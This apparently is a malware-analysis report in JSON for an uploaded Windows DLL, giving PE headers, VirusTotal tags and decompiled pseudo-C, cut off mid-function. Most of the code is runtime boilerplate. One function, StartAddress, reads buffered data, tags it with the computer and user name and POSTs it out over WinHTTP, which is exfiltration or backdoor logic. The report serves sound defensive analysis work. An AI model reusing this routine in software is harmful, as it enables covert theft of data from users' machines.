{
  "get_metadata": {
    "path": "D:\\Whitehat\\web\\YARRAI_Web\\backend\\uploads\\dac3cb6d-77e2-4911-a9ef-3518b2c7af74.exe",
    "module": "dac3cb6d-77e2-4911-a9ef-3518b2c7af74.exe",
    "base": "0x180000000",
    "size": "0x54000",
    "md5": "4e42a438248cd121a8f7dda2787d9bce",
    "sha256": "a2559bd56290c52c0b3c841fbb3ac50c8048be02c2a97983651d47ea19f0cf48",
    "crc32": "0xe9f157dc",
    "filesize": "0x4e600"
  },
  "get_current_address": "0x180011a60",
  "get_current_function": "0x180011a60",
  "get_entry_points": [
    {
      "address": "0x180004f90",
      "name": "MsiSetExternalUIRecord",
      "size": "0x3d"
    },
    {
      "address": "0x180004f90",
      "name": "MsiSetExternalUIRecord",
      "size": "0x3d"
    },
    {
      "address": "0x180004f90",
      "name": "MsiSetExternalUIRecord",
      "size": "0x3d"
    },
    {
      "address": "0x180011a60",
      "name": "DllEntryPoint",
      "size": "0x3d"
    }
  ],
  "file_entropy": 6.308461050110098,
  "string_stats": {
    "string_count": 513,
    "avg_str_len": 0.0,
    "max_str_len": 0
  },
  "pe_headers": {
    "file_name": "dac3cb6d-77e2-4911-a9ef-3518b2c7af74.exe",
    "machine": "0x8664",
    "number_of_sections": 6,
    "time_date_stamp": "0x678dd869",
    "pointer_to_symbol_table": "0x0",
    "number_of_symbols": 0,
    "size_of_optional_header": 240,
    "characteristics": "0x2022",
    "entry_point": "0x11a60",
    "image_base": "0x180000000",
    "section_alignment": "0x1000",
    "file_alignment": "0x200",
    "subsystem": "0x2",
    "dll_characteristics": "0x160",
    "sections": [
      {
        "name": ".text",
        "virtual_address": "0x1000",
        "virtual_size": "0x3722c",
        "raw_size": "0x37400",
        "characteristics": "0x60000020"
      },
      {
        "name": ".rdata",
        "virtual_address": "0x39000",
        "virtual_size": "0x11db6",
        "raw_size": "0x11e00",
        "characteristics": "0x40000040"
      },
      {
        "name": ".data",
        "virtual_address": "0x4b000",
        "virtual_size": "0x3210",
        "raw_size": "0x1600",
        "characteristics": "0xc0000040"
      },
      {
        "name": ".pdata",
        "virtual_address": "0x4f000",
        "virtual_size": "0x2b14",
        "raw_size": "0x2c00",
        "characteristics": "0x40000040"
      },
      {
        "name": ".rsrc",
        "virtual_address": "0x52000",
        "virtual_size": "0xf8",
        "raw_size": "0x200",
        "characteristics": "0x40000040"
      },
      {
        "name": ".reloc",
        "virtual_address": "0x53000",
        "virtual_size": "0xa40",
        "raw_size": "0xc00",
        "characteristics": "0x42000040"
      }
    ]
  },
  "virustotal": {
    "sha256": "a2559bd56290c52c0b3c841fbb3ac50c8048be02c2a97983651d47ea19f0cf48",
    "type_tag": "pedll",
    "popular_threat_name": null,
    "tags": [
      "pedll",
      "detect-debug-environment",
      "idle",
      "64bits",
      "long-sleeps"
    ]
  },
  "c_code": [
    "#include \"dac3cb6d-77e2-4911-a9ef-3518b2c7af74.h\"",
    "",
    "int sub_180001000()",
    "{",
    "  sub_18000FC2C(&unk_18004C550);",
    "  return atexit(sub_180038060);",
    "}",
    "",
    "",
    "int sub_180001038()",
    "{",
    "  sub_180010A10(&qword_18004C7A0, &qword_18004C810, 0, 1);",
    "  return atexit(sub_180038108);",
    "}",
    "",
    "",
    "int sub_180001068()",
    "{",
    "  __int64 v0; // rbx",
    "",
    "  v0 = sub_1800173B8(2);",
    "  sub_1800094E0(&qword_18004C810);",
    "  qword_18004C810 = (__int64)&off_18003A5D0;",
    "  sub_180008290(&qword_18004C810, v0, 0);",
    "  return atexit(sub_18003815C);",
    "}",
    "",
    "",
    "int sub_1800010F0()",
    "{",
    "  sub_18000FC2C(&unk_18004C790);",
    "  return atexit(sub_180038168);",
    "}",
    "",
    "",
    "int sub_180001110()",
    "{",
    "  sub_180010A10(&qword_18004C8C0, &qword_18004C930, 0, 1);",
    "  return atexit(sub_180038174);",
    "}",
    "",
    "",
    "int sub_180001140()",
    "{",
    "  __int64 v0; // rbx",
    "",
    "  v0 = sub_1800173B8(1);",
    "  sub_1800094E0(&qword_18004C930);",
    "  qword_18004C930 = (__int64)&off_18003A5D0;",
    "  sub_180008290(&qword_18004C930, v0, 0);",
    "  return atexit(sub_1800381C8);",
    "}",
    "",
    "",
    "int sub_1800011D8()",
    "{",
    "  sub_18000FC2C(&unk_18004C8B0);",
    "  return atexit(sub_1800381D4);",
    "}",
    "",
    "",
    "int sub_1800011F8()",
    "{",
    "  sub_18000FC2C(&unk_18004CA10);",
    "  return atexit(sub_180038220);",
    "}",
    "",
    "",
    "__int64 sub_180001240(int a1, ...)",
    "{",
    "  int v2; // ebx",
    "  _QWORD *v3; // rax",
    "  va_list va; // [rsp+58h] [rbp+10h] BYREF",
    "",
    "  va_start(va, a1);",
    "  v2 = sub_1800173B8(1);",
    "  v3 = (_QWORD *)sub_180001230();",
    "  return sub_18001A094(*v3, v2, a1, 0, (__int64)va);",
    "}",
    "",
    "",
    "__int64 sub_1800012A0(int a1, int a2, int a3, ...)",
    "{",
    "  _QWORD *v6; // rax",
    "  __int64 result; // rax",
    "  va_list va; // [rsp+78h] [rbp+20h] BYREF",
    "",
    "  va_start(va, a3);",
    "  v6 = (_QWORD *)sub_180001230();",
    "  result = sub_18001A1B8(*v6, a1, a2, a3, 0, (__int64)va);",
    "  if ( (int)result < 0 )",
    "    return 0xFFFFFFFFLL;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180001300(__int64 a1, __int64 a2)",
    "{",
    "  *(_QWORD *)a1 = &off_1800394A8;",
    "  *(_OWORD *)(a1 + 8) = 0;",
    "  sub_1800135A8(a2 + 8);",
    "  return a1;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_180001360(_QWORD *a1, char a2)",
    "{",
    "  *a1 = &off_1800394A8;",
    "  sub_180013638(a1 + 1);",
    "  if ( (a2 & 1) != 0 )",
    "    sub_1800116E0(a1, 24);",
    "  return a1;",
    "}",
    "",
    "",
    "void  Concurrency::cancel_current_task(void)",
    "{",
    "  _BYTE pExceptionObject[40]; // [rsp+20h] [rbp-28h] BYREF",
    "",
    "  sub_1800013D0(pExceptionObject);",
    "  throw (std::bad_array_new_length *)pExceptionObject;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180001420(__int64 a1, __int64 a2)",
    "{",
    "  *(_QWORD *)a1 = &off_1800394A8;",
    "  *(_OWORD *)(a1 + 8) = 0;",
    "  sub_1800135A8(a2 + 8);",
    "  *(_QWORD *)a1 = &off_18003A410;",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180001460(__int64 a1, __int64 a2)",
    "{",
    "  *(_QWORD *)a1 = &off_1800394A8;",
    "  *(_OWORD *)(a1 + 8) = 0;",
    "  sub_1800135A8(a2 + 8);",
    "  *(_QWORD *)a1 = &off_1800394C0;",
    "  return a1;",
    "}",
    "",
    "",
    "void  std::vector<void *>::_Xlen()",
    "{",
    "  sub_18000FF90(\"string too long\");",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800014C0(__int64 a1, __int64 a2)",
    "{",
    "  *(_QWORD *)a1 = &off_1800394A8;",
    "  *(_OWORD *)(a1 + 8) = 0;",
    "  sub_1800135A8(a2 + 8);",
    "  *(_QWORD *)a1 = &off_180039548;",
    "  return a1;",
    "}",
    "",
    "",
    "bool __fastcall sub_180001510(__int64 a1, unsigned int a2, __int64 a3)",
    "{",
    "  __int64 v4; // rax",
    "  _BYTE v6[24]; // [rsp+20h] [rbp-18h] BYREF",
    "",
    "  v4 = (*(__int64 (__fastcall **)(__int64, _BYTE *, _QWORD))(*(_QWORD *)a1 + 24LL))(a1, v6, a2);",
    "  return *(_QWORD *)(*(_QWORD *)(v4 + 8) + 8LL) == *(_QWORD *)(*(_QWORD *)(a3 + 8) + 8LL)",
    "      && *(_DWORD *)v4 == *(_DWORD *)a3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180001590(__int64 a1, __m128i *a2, __int64 a3)",
    "{",
    "  __int64 v5; // rax",
    "  __int64 v6; // rdi",
    "  __m128i v7; // xmm6",
    "  unsigned __int64 v8; // rcx",
    "  _QWORD *v9; // rdx",
    "  unsigned __int64 v10; // rdx",
    "  __int64 v11; // rcx",
    "  __int128 *v12; // rax",
    "  __int64 v13; // rdx",
    "  __int64 v14; // rcx",
    "  __int128 v16; // [rsp+20h] [rbp-A8h] BYREF",
    "  __int128 v17; // [rsp+30h] [rbp-98h]",
    "  _QWORD v18[3]; // [rsp+40h] [rbp-88h] BYREF",
    "  unsigned __int64 v19; // [rsp+58h] [rbp-70h]",
    "  _BYTE v20[32]; // [rsp+60h] [rbp-68h] BYREF",
    "  _OWORD *v21; // [rsp+80h] [rbp-48h] BYREF",
    "  char v22; // [rsp+88h] [rbp-40h]",
    "",
    "  v21 = (_OWORD *)a1;",
    "  v5 = sub_180006D30(v20, a3);",
    "  v6 = v5;",
    "  v21 = (_OWORD *)v5;",
    "  v7 = *a2;",
    "  if ( *(_QWORD *)(v5 + 16) )",
    "    sub_180008910(v5, \": \", 2);",
    "  v8 = _mm_srli_si128(v7, 8).m128i_u64[0];",
    "  (*(void (__fastcall **)(unsigned __int64, _QWORD *, _QWORD))(*(_QWORD *)v8 + 16LL))(",
    "    v8,",
    "    v18,",
    "    (unsigned int)_mm_cvtsi128_si32(v7));",
    "  v9 = v18;",
    "  if ( v19 > 0xF )",
    "    v9 = (_QWORD *)v18[0];",
    "  sub_180008910(v6, v9, v18[2]);",
    "  if ( v19 > 0xF )",
    "  {",
    "    v10 = v19 + 1;",
    "    v11 = v18[0];",
    "    if ( v19 + 1 >= 0x1000 )",
    "    {",
    "      v10 = v19 + 40;",
    "      v11 = *(_QWORD *)(v18[0] - 8LL);",
    "      if ( (unsigned __int64)(v18[0] - v11 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v11, v10);",
    "  }",
    "  v16 = 0;",
    "  v17 = 0;",
    "  v16 = *(_OWORD *)v6;",
    "  v17 = *(_OWORD *)(v6 + 16);",
    "  *(_QWORD *)(v6 + 16) = 0;",
    "  *(_QWORD *)(v6 + 24) = 15;",
    "  *(_BYTE *)v6 = 0;",
    "  v12 = &v16;",
    "  if ( *((_QWORD *)&v17 + 1) > 0xFu )",
    "    v12 = (__int128 *)v16;",
    "  *(_QWORD *)a1 = &off_1800394A8;",
    "  *(_OWORD *)(a1 + 8) = 0;",
    "  v21 = v12;",
    "  v22 = 1;",
    "  sub_1800135A8(&v21);",
    "  *(_QWORD *)a1 = &off_180039548;",
    "  if ( *((_QWORD *)&v17 + 1) > 0xFu )",
    "  {",
    "    v13 = *((_QWORD *)&v17 + 1) + 1LL;",
    "    v14 = v16;",
    "    if ( (unsigned __int64)(*((_QWORD *)&v17 + 1) + 1LL) >= 0x1000 )",
    "    {",
    "      v13 = *((_QWORD *)&v17 + 1) + 40LL;",
    "      v14 = *(_QWORD *)(v16 - 8);",
    "      if ( (unsigned __int64)(v16 - v14 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v14, v13);",
    "  }",
    "  *(_QWORD *)a1 = &off_18003A428;",
    "  *(__m128i *)(a1 + 24) = v7;",
    "  return a1;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_180001770(_QWORD *a1, char a2)",
    "{",
    "  *a1 = &off_1800394A8;",
    "  sub_180013638(a1 + 1);",
    "  if ( (a2 & 1) != 0 )",
    "    sub_1800116E0(a1, 40);",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800017C0(__int64 a1, __int64 a2)",
    "{",
    "  __int128 v4; // xmm0",
    "  __int64 result; // rax",
    "",
    "  *(_QWORD *)a1 = &off_1800394A8;",
    "  *(_OWORD *)(a1 + 8) = 0;",
    "  sub_1800135A8(a2 + 8);",
    "  *(_QWORD *)a1 = &off_18003A428;",
    "  v4 = *(_OWORD *)(a2 + 24);",
    "  *(_QWORD *)a1 = &MEMORY[0x18003A440];",
    "  result = a1;",
    "  *(_OWORD *)(a1 + 24) = v4;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180001820(__int64 a1, __int64 a2)",
    "{",
    "  __int64 result; // rax",
    "",
    "  *(_QWORD *)a1 = &off_1800394A8;",
    "  *(_OWORD *)(a1 + 8) = 0;",
    "  sub_1800135A8(a2 + 8);",
    "  *(_QWORD *)a1 = &off_18003A428;",
    "  result = a1;",
    "  *(_OWORD *)(a1 + 24) = *(_OWORD *)(a2 + 24);",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180001880(__int64 a1, __int64 a2, unsigned int a3)",
    "{",
    "  __int64 v4; // r8",
    "  const char *v5; // rdx",
    "  __int64 v6; // rax",
    "",
    "  if ( a3 == 1 )",
    "  {",
    "    v4 = 21;",
    "    *(_OWORD *)a2 = 0;",
    "    *(_QWORD *)(a2 + 16) = 0;",
    "    *(_QWORD *)(a2 + 24) = 0;",
    "    v5 = \"iostream stream error\";",
    "  }",
    "  else",
    "  {",
    "    v6 = sub_18000FFFC(a3);",
    "    v4 = -1;",
    "    *(_OWORD *)a2 = 0;",
    "    *(_QWORD *)(a2 + 16) = 0;",
    "    *(_QWORD *)(a2 + 24) = 0;",
    "    do",
    "      ++v4;",
    "    while ( *(_BYTE *)(v6 + v4) );",
    "    v5 = (const char *)v6;",
    "  }",
    "  sub_18000A3D0(a2, v5, v4);",
    "  return a2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180001900(__int64 a1, char a2)",
    "{",
    "  if ( (a2 & 1) != 0 )",
    "    sub_1800116E0(a1, 16);",
    "  return a1;",
    "}",
    "",
    "",
    "void  Concurrency::cancel_current_task(void)",
    "{",
    "  _BYTE pExceptionObject[40]; // [rsp+20h] [rbp-28h] BYREF",
    "",
    "  sub_180001930(pExceptionObject);",
    "  throw (std::bad_cast *)pExceptionObject;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180001980(__int64 a1, __int64 a2)",
    "{",
    "  *(_QWORD *)a1 = &off_1800394A8;",
    "  *(_OWORD *)(a1 + 8) = 0;",
    "  sub_1800135A8(a2 + 8);",
    "  *(_QWORD *)a1 = &off_18003A490;",
    "  return a1;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_1800019C0(_QWORD *a1, char a2)",
    "{",
    "  *a1 = &off_18003A3C0;",
    "  if ( (a2 & 1) != 0 )",
    "    sub_1800116E0(a1, 8);",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800019F0(__int64 a1)",
    "{",
    "  std::_Locinfo::_Locinfo_dtor((struct std::_Locinfo *)a1);",
    "  if ( *(_QWORD *)(a1 + 88) )",
    "    sub_18001A2CC();",
    "  *(_QWORD *)(a1 + 88) = 0;",
    "  if ( *(_QWORD *)(a1 + 72) )",
    "    sub_18001A2CC();",
    "  *(_QWORD *)(a1 + 72) = 0;",
    "  if ( *(_QWORD *)(a1 + 56) )",
    "    sub_18001A2CC();",
    "  *(_QWORD *)(a1 + 56) = 0;",
    "  if ( *(_QWORD *)(a1 + 40) )",
    "    sub_18001A2CC();",
    "  *(_QWORD *)(a1 + 40) = 0;",
    "  if ( *(_QWORD *)(a1 + 24) )",
    "    sub_18001A2CC();",
    "  *(_QWORD *)(a1 + 24) = 0;",
    "  if ( *(_QWORD *)(a1 + 8) )",
    "    sub_18001A2CC();",
    "  *(_QWORD *)(a1 + 8) = 0;",
    "  return sub_18000FCE8(a1);",
    "}",
    "",
    "",
    "void __fastcall sub_180001AC0(__int64 a1)",
    "{",
    "  __int64 v1; // rcx",
    "  void (__fastcall ***v2)(_QWORD, __int64); // rax",
    "",
    "  v1 = *(_QWORD *)(a1 + 8);",
    "  if ( v1 )",
    "  {",
    "    v2 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 16LL))(v1);",
    "    if ( v2 )",
    "      (**v2)(v2, 1);",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180001B00(__int64 *a1, __int64 a2)",
    "{",
    "  __int64 v4; // rsi",
    "  __int64 v5; // rcx",
    "  void *v6; // rbx",
    "  _OWORD *v7; // rax",
    "  __int128 v8; // xmm1",
    "  _BYTE v10[8]; // [rsp+20h] [rbp-49h] BYREF",
    "  __int64 v11; // [rsp+28h] [rbp-41h]",
    "  char v12; // [rsp+30h] [rbp-39h]",
    "  __int64 v13; // [rsp+38h] [rbp-31h]",
    "  char v14; // [rsp+40h] [rbp-29h]",
    "  __int64 v15; // [rsp+48h] [rbp-21h]",
    "  __int16 v16; // [rsp+50h] [rbp-19h]",
    "  __int64 v17; // [rsp+58h] [rbp-11h]",
    "  __int16 v18; // [rsp+60h] [rbp-9h]",
    "  __int64 v19; // [rsp+68h] [rbp-1h]",
    "  char v20; // [rsp+70h] [rbp+7h]",
    "  __int64 v21; // [rsp+78h] [rbp+Fh]",
    "  char v22; // [rsp+80h] [rbp+17h]",
    "  _BYTE v23[40]; // [rsp+88h] [rbp+1Fh] BYREF",
    "",
    "  if ( a1 && !*a1 )",
    "  {",
    "    v4 = sub_180011714(48);",
    "    v5 = *(_QWORD *)(a2 + 8);",
    "    if ( v5 )",
    "    {",
    "      v6 = *(void **)(v5 + 40);",
    "      if ( !v6 )",
    "        v6 = (void *)(v5 + 48);",
    "    }",
    "    else",
    "    {",
    "      v6 = &unk_18004477D;",
    "    }",
    "    sub_18000FC70(v10, 0);",
    "    v11 = 0;",
    "    v12 = 0;",
    "    v13 = 0;",
    "    v14 = 0;",
    "    v15 = 0;",
    "    v16 = 0;",
    "    v17 = 0;",
    "    v18 = 0;",
    "    v19 = 0;",
    "    v20 = 0;",
    "    v21 = 0;",
    "    v22 = 0;",
    "    if ( !v6 )",
    "      sub_18000FFD8(\"bad locale name\");",
    "    sub_180010330(v10, v6);",
    "    *(_DWORD *)(v4 + 8) = 0;",
    "    *(_QWORD *)v4 = &off_18003A4A8;",
    "    v7 = (_OWORD *)sub_18001048C(v23);",
    "    v8 = v7[1];",
    "    *(_OWORD *)(v4 + 16) = *v7;",
    "    *(_OWORD *)(v4 + 32) = v8;",
    "    *a1 = v4;",
    "    std::_Locinfo::_Locinfo_dtor((struct std::_Locinfo *)v10);",
    "    if ( v21 )",
    "      sub_18001A2CC();",
    "    v21 = 0;",
    "    if ( v19 )",
    "      sub_18001A2CC();",
    "    v19 = 0;",
    "    if ( v17 )",
    "      sub_18001A2CC();",
    "    v17 = 0;",
    "    if ( v15 )",
    "      sub_18001A2CC();",
    "    v15 = 0;",
    "    if ( v13 )",
    "      sub_18001A2CC();",
    "    v13 = 0;",
    "    if ( v11 )",
    "      sub_18001A2CC();",
    "    v11 = 0;",
    "    sub_18000FCE8(v10);",
    "  }",
    "  return 2;",
    "}",
    "",
    "",
    "_BYTE *__fastcall sub_180001CA0(__int64 a1, _BYTE *a2, _BYTE *a3)",
    "{",
    "  _BYTE *v4; // rbx",
    "  __int64 v5; // rdi",
    "",
    "  v4 = a2;",
    "  if ( a2 != a3 )",
    "  {",
    "    v5 = a1 + 16;",
    "    do",
    "    {",
    "      *v4 = sub_18001054C((unsigned __int8)*v4, v5);",
    "      ++v4;",
    "    }",
    "    while ( v4 != a3 );",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "_BYTE *__fastcall sub_180001D00(__int64 a1, _BYTE *a2, _BYTE *a3)",
    "{",
    "  _BYTE *v4; // rbx",
    "  __int64 v5; // rdi",
    "",
    "  v4 = a2;",
    "  if ( a2 != a3 )",
    "  {",
    "    v5 = a1 + 16;",
    "    do",
    "    {",
    "      *v4 = sub_180010718((unsigned __int8)*v4, v5);",
    "      ++v4;",
    "    }",
    "    while ( v4 != a3 );",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "__int64 __fastcall std::ctype<char>::do_widen(__int64 a1, __int64 a2, __int64 a3, __int64 a4)",
    "{",
    "  sub_180036160(a4, a2, a3 - a2);",
    "  return a3;",
    "}",
    "",
    "",
    "__int64 __fastcall std::ctype<char>::do_narrow(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)",
    "{",
    "  sub_180036160(a5, a2, a3 - a2);",
    "  return a3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180001DA0(__int64 a1, __int64 a2)",
    "{",
    "  char v2; // di",
    "  int v4; // eax",
    "",
    "  v2 = a2;",
    "  *(_QWORD *)a1 = &off_18003A4A8;",
    "  v4 = *(_DWORD *)(a1 + 32);",
    "  if ( v4 <= 0 )",
    "  {",
    "    if ( v4 < 0 )",
    "      sub_1800116E0(*(_QWORD *)(a1 + 24), a2);",
    "  }",
    "  else",
    "  {",
    "    sub_18001A2CC(*(_QWORD *)(a1 + 24));",
    "  }",
    "  sub_18001A2CC(*(_QWORD *)(a1 + 40));",
    "  *(_QWORD *)a1 = &off_18003A3C0;",
    "  if ( (v2 & 1) != 0 )",
    "    sub_1800116E0(a1, 48);",
    "  return a1;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_180001E10(_QWORD *a1, __int64 a2, __m128i *a3)",
    "{",
    "  __m128i v4; // xmm6",
    "  __int64 v5; // r8",
    "  __int64 v6; // rdx",
    "  __int64 v7; // rcx",
    "  __m128i v9; // [rsp+20h] [rbp-48h] BYREF",
    "  __int128 v10; // [rsp+30h] [rbp-38h] BYREF",
    "  __int128 v11; // [rsp+40h] [rbp-28h]",
    "",
    "  v9.m128i_i64[0] = (__int64)a1;",
    "  v4 = *a3;",
    "  v10 = 0;",
    "  v11 = 0;",
    "  v5 = -1;",
    "  do",
    "    ++v5;",
    "  while ( *(_BYTE *)(a2 + v5) );",
    "  sub_18000A3D0(&v10, a2, v5);",
    "  v9 = v4;",
    "  sub_180001590((__int64)a1, &v9, (__int64)&v10);",
    "  if ( *((_QWORD *)&v11 + 1) > 0xFu )",
    "  {",
    "    v6 = *((_QWORD *)&v11 + 1) + 1LL;",
    "    v7 = v10;",
    "    if ( (unsigned __int64)(*((_QWORD *)&v11 + 1) + 1LL) >= 0x1000 )",
    "    {",
    "      v6 = *((_QWORD *)&v11 + 1) + 40LL;",
    "      v7 = *(_QWORD *)(v10 - 8);",
    "      if ( (unsigned __int64)(v10 - v7 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v7, v6);",
    "  }",
    "  *a1 = &off_18003A508;",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180001ED0(__int64 a1, __int64 a2)",
    "{",
    "  __int128 v4; // xmm0",
    "  __int64 result; // rax",
    "",
    "  *(_QWORD *)a1 = &off_1800394A8;",
    "  *(_OWORD *)(a1 + 8) = 0;",
    "  sub_1800135A8(a2 + 8);",
    "  *(_QWORD *)a1 = &off_18003A428;",
    "  v4 = *(_OWORD *)(a2 + 24);",
    "  *(_QWORD *)a1 = &off_18003A508;",
    "  result = a1;",
    "  *(_OWORD *)(a1 + 24) = v4;",
    "  return result;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_180001F30(_QWORD *a1, char a2)",
    "{",
    "  *a1 = &off_18003A520;",
    "  sub_1800108D0();",
    "  if ( (a2 & 1) != 0 )",
    "    sub_1800116E0(a1, 72);",
    "  return a1;",
    "}",
    "",
    "",
    "PCONTEXT __fastcall StartAddress(XSAVE_FORMAT *lpThreadParameter)",
    "{",
    "  DWORD v1; // ebp",
    "  unsigned int v2; // edi",
    "  int v3; // ebx",
    "  __int64 v4; // rsi",
    "  int v5; // eax",
    "  DWORD NumberOfBytesRead; // [rsp+40h] [rbp-1F68h] BYREF",
    "  int v8[3]; // [rsp+44h] [rbp-1F64h] BYREF",
    "  _BYTE Buffer[8000]; // [rsp+50h] [rbp-1F58h] BYREF",
    "",
    "  sub_1800368A0(Buffer, 0, 8000);",
    "  if ( !ReadFile(lpParameter, Buffer, 0x1F40u, &NumberOfBytesRead, 0) )",
    "    return 0;",
    "  do",
    "  {",
    "    v1 = NumberOfBytesRead;",
    "    if ( !NumberOfBytesRead )",
    "      break;",
    "    GetComputerNameW(&::Buffer, (LPDWORD)&pcbBuffer);",
    "    LODWORD(pcbBuffer) = 100;",
    "    GetUserNameW(&word_18004DF50, (LPDWORD)&pcbBuffer);",
    "    wsprintfW(&pwszObjectName, L\"search:%s_%s\", &::Buffer, &word_18004DF50);",
    "    hRequest = WinHttpOpenRequest(hInternet, L\"POST\", &pwszObjectName, 0, 0, 0, 0x800100u);",
    "    v2 = 0;",
    "    v3 = 1;",
    "    v4 = 10;",
    "    do",
    "    {",
    "      sub_180001240((int)\"%d \", v2);",
    "      v5 = v3 + v2;",
    "      v2 = v3;",
    "      v3 = v5;",
    "      --v4;",
    "    }",
    "    while ( v4 );",
    "    sub_180001240((int)\"\\n\");",
    "    v8[0] = 12544;",
    "    WinHttpSetOption(hRequest, 0x1Fu, v8, 4u);",
    "    Sleep(0x1F4u);",
    "    WinHttpSendRequest(hRequest, 0, 0, Buffer, v1, v1, 0);",
    "    sub_1800368A0(Buffer, 0, 8000);",
    "  }",
    "  while ( ReadFile(lpParameter, Buffer, 0x1F40u, &NumberOfBytesRead, 0) );",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 *__fastcall sub_1800021A0(__int64 *a1)",
    "{",
    "  __int64 v2; // rdi",
    "  __int64 v3; // rax",
    "  __int64 *result; // rax",
    "  __int64 v5; // rdx",
    "",
    "  v2 = sub_1800109E4();",
    "  v3 = sub_1800109C8();",
    "  if ( v2 == 10000000 )",
    "  {",
    "    *a1 = 100 * v3;",
    "    return a1;",
    "  }",
    "  else if ( v2 == 24000000 )",
    "  {",
    "    v5 = 1000000000 * (v3 / 24000000) + 1000000000 * (v3 % 24000000) / 24000000;",
    "    result = a1;",
    "    *a1 = v5;",
    "  }",
    "  else",
    "  {",
    "    *a1 = 1000000000 * (v3 / v2) + 1000000000 * (v3 % v2) / v2;",
    "    return a1;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 sub_180002280()",
    "{",
    "  unsigned int v0; // r14d",
    "  void *v1; // rax",
    "  void *v2; // rcx",
    "  int v3; // eax",
    "  __int128 *p_lpBuffer; // rdx",
    "  __int128 *v5; // rcx",
    "  __int128 *v6; // rbx",
    "  unsigned __int64 v7; // rdi",
    "  unsigned __int64 v8; // rsi",
    "  __int128 *i; // rax",
    "  __int128 *v10; // rdx",
    "  __int64 v11; // rdx",
    "  __int64 v12; // rcx",
    "  int v13; // r9d",
    "  __int64 v14; // r8",
    "  const char *v15; // rbx",
    "  __int64 v16; // rdi",
    "  __m128i *v17; // rax",
    "  __int64 v18; // rax",
    "  __int128 v19; // xmm7",
    "  __m128i v20; // xmm6",
    "  __int64 v21; // rdx",
    "  __int64 v22; // rcx",
    "  unsigned __int64 v23; // rdx",
    "  __int64 v24; // rcx",
    "  unsigned __int64 v25; // xmm6_8",
    "  unsigned __int64 v26; // rdx",
    "  __int64 v27; // rcx",
    "  __int64 v28; // rax",
    "  __int128 *v29; // rcx",
    "  __int128 *v30; // rcx",
    "  __int128 *j; // rax",
    "  __int128 *v32; // rdx",
    "  __int64 v33; // rdx",
    "  __int64 v34; // rcx",
    "  int v35; // r9d",
    "  __int64 v36; // r8",
    "  const char *v37; // rbx",
    "  __int64 v38; // rdi",
    "  __m128i *v39; // rax",
    "  __int64 v40; // rax",
    "  __int128 v41; // xmm7",
    "  __m128i v42; // xmm6",
    "  __int64 v43; // rdx",
    "  __int64 v44; // rcx",
    "  unsigned __int64 v45; // rdx",
    "  __int64 v46; // rcx",
    "  unsigned __int64 v47; // xmm6_8",
    "  unsigned __int64 v48; // rdx",
    "  __int64 v49; // rcx",
    "  __int64 v50; // rax",
    "  __int128 *v51; // rcx",
    "  __int128 *k; // rax",
    "  __int128 *v53; // rdx",
    "  __int64 v54; // rdx",
    "  __int64 v55; // rcx",
    "  int v56; // r9d",
    "  __int64 v57; // r8",
    "  const char *v58; // rbx",
    "  __int64 v59; // rdi",
    "  __m128i *v60; // rax",
    "  __int64 v61; // rax",
    "  __int128 v62; // xmm7",
    "  __m128i v63; // xmm6",
    "  __int64 v64; // rdx",
    "  __int64 v65; // rcx",
    "  unsigned __int64 v66; // rdx",
    "  __int64 v67; // rcx",
    "  unsigned __int64 v68; // xmm6_8",
    "  __int64 v69; // rax",
    "  __int128 *v70; // rcx",
    "  __int128 *m; // rax",
    "  __int128 *v72; // rdx",
    "  __int64 v73; // rdx",
    "  __int64 v74; // rcx",
    "  __int64 v75; // rcx",
    "  __int64 v76; // rax",
    "  __int128 *v77; // rdx",
    "  __int64 v78; // rax",
    "  __int128 *v79; // rdx",
    "  BOOL v80; // eax",
    "  HANDLE v81; // rsi",
    "  __int128 *v82; // rcx",
    "  unsigned __int64 v83; // rdx",
    "  char *v84; // rax",
    "  __m128i v86; // [rsp+48h] [rbp-C0h] BYREF",
    "  __m128i si128; // [rsp+58h] [rbp-B0h]",
    "  _QWORD v88[2]; // [rsp+68h] [rbp-A0h] BYREF",
    "  __int64 v89; // [rsp+78h] [rbp-90h]",
    "  unsigned __int64 v90; // [rsp+80h] [rbp-88h]",
    "  _QWORD v91[2]; // [rsp+88h] [rbp-80h] BYREF",
    "  __int64 v92; // [rsp+98h] [rbp-70h]",
    "  unsigned __int64 v93; // [rsp+A0h] [rbp-68h]",
    "  _QWORD v94[2]; // [rsp+A8h] [rbp-60h] BYREF",
    "  __int64 v95; // [rsp+B8h] [rbp-50h]",
    "  unsigned __int64 v96; // [rsp+C0h] [rbp-48h]",
    "  __int64 dwNumberOfBytesAvailable; // [rsp+C8h] [rbp-40h] BYREF",
    "  int v98; // [rsp+D0h] [rbp-38h] BYREF",
    "  __int128 lpBuffer; // [rsp+D8h] [rbp-30h] BYREF",
